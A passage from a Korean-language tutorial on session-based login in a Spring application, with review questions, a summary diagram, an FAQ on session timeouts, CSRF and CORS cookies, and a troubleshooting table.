- 운영에서는 반드시 HTTPS를 쓰고, 쿠키에 `Secure` 플래그(HTTPS에서만 전송)도 함께 둔다.

### ✅ 확인 질문

> **Q1.** 로그인된 상태에서 `logout` 호출 후, 같은 JSESSIONID 쿠키로 보호된 API를 호출하면 어떤 상태 코드가 돌아오는가? 왜?
>
> **A1.** 401 (`LOGIN_REQUIRED`). 서버 측 세션이 `invalidate()`로 제거되어 같은 JSESSIONID 값으로 조회해도 매칭되는 세션이 없다 → `@SessionAttribute(required = false)`의 `loginUserId`가 `null` → `requireLogin()`이 `UnauthorizedException`을 던진다.

> **Q2.** 서비스가 성장해 서버를 3대로 늘려 로드밸런서 뒤에 둔다고 하자. 현재의 세션 인증을 그대로 두면 어떤 문제가 생기고, 가장 일반적인 해결책 두 가지는?
>
> **A2.** 서버 A에서 로그인한 사용자가 다음 요청에서 서버 B로 라우팅되면 세션이 없어 401이 된다. 해결책 (1) 세션 저장소를 외부화 — Spring Session + Redis 등으로 모든 서버가 같은 저장소를 공유. (2) 인증 자체를 stateless 화 — JWT로 전환해 서버가 세션을 갖지 않게 한다.

---

## 5. 핵심 요약 한 장

```
┌──────────────────────────────────────────────────────────────────────┐
│  HTTP는 stateless → "기억하는 척" 하려면 쿠키+세션이 필요              │
│                                                                       │
│  세션  = 서버 메모리 Map (Tomcat이 관리)                              │
│  쿠키  = 그 Map을 가리키는 열쇠 (JSESSIONID, HttpOnly)                │
│                                                                       │
│  저장:  session.setAttribute(SessionConst.LOGIN_USER_ID, userId)      │
│         ↑ AuthController#login                                        │
│  사용:  @SessionAttribute(name=..., required=false) Long loginUserId  │
│         ↑ PostController#create, BoardController#create               │
│  종료:  request.getSession(false).invalidate()                        │
│         ↑ AuthController#logout                                       │
│                                                                       │
│  한계:  메모리, 다중 서버 → 다음 단계 JWT(stateless)로 발전           │
│  보안:  HttpOnly / 로그인 시 세션 재생성 / HTTPS                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 부록. 자주 나오는 질문 (FAQ)

| 질문 | 답변 요약 |
|------|-----------|
| 세션 타임아웃을 바꾸려면? | `application.yaml`에 `server.servlet.session.timeout: 1h` 같이 설정. 또는 코드에서 `session.setMaxInactiveInterval(3600)` (초). |
| 같은 사용자가 두 브라우저로 로그인하면? | 각각 다른 JSESSIONID로 **별개의 세션**이 생긴다. 한 쪽에서 로그아웃해도 다른 쪽은 살아있다. |
| `setAttribute`에 무엇을 넣을 수 있나? | `Object`라면 무엇이든. 단 외부 세션 저장소(Redis 등)에 직렬화돼야 하므로 `Serializable` 권장. 이 프로젝트는 `Long`(`user.id()`)만 저장 — 간결하고 안전. |
| 왜 User 객체 전체를 세션에 넣지 않나? | (1) 메모리 낭비 (2) 비밀번호 해시까지 세션에 노출 (3) DB 상태와 동기화 안 됨. **ID만 저장**하고 필요할 때 Service에서 다시 조회하는 게 정석. |
| `csrf.disable`로 두면 안 되는 거 아닌가? | 운영 환경에선 켜야 한다. 이 프로젝트는 학습 단계 1 단순화를 위해 끈 상태이며 (`SecurityConfig` 주석 참고), 단계 2에서 함께 다룬다. |
| 브라우저가 쿠키를 안 보낸다 / 다른 도메인에서 안 된다 | CORS와 쿠키의 SameSite 정책 문제. 프론트가 다른 origin이면 `withCredentials: true`(클라이언트), 서버는 `Access-Control-Allow-Credentials` 및 `SameSite=None; Secure` 설정 필요. |

---

## 부록. 트러블슈팅

| 증상 | 원인 | 해결 |
|------|------|------|
| 로그인했는데 후속 요청이 401 | curl이 쿠키를 안 보내고 있음 | `-c cookies.txt`(저장) → `-b cookies.txt`(전송) 함께 사용 |
| `ClassCastException: ... cannot be cast to Long` | `setAttribute`에 `Integer`로 넣고 `Long`으로 꺼냈거나 그 반대 | 저장/조회 타입 통일 (이 프로젝트는 `Long user.id()`) |
| 앱 재시작 후 모두 로그아웃됨 | 기본 세션 저장소가 Tomcat 메모리 (휘발성) | 외부 세션 저장소 도입(Redis) 또는 stateless 인증 전환 |
| `getSession(false)`가 자꾸 `null` | 클라이언트가 쿠키를 안 보내거나 도메인/path가 안 맞음 | 브라우저 DevTools → Application → Cookies 또는 `curl -v`로 확인 |
| 세션은 살아있는데 `@SessionAttribute`로 null | attribute 키 오타 | `SessionConst.LOGIN_USER_ID` 상수로 통일 |
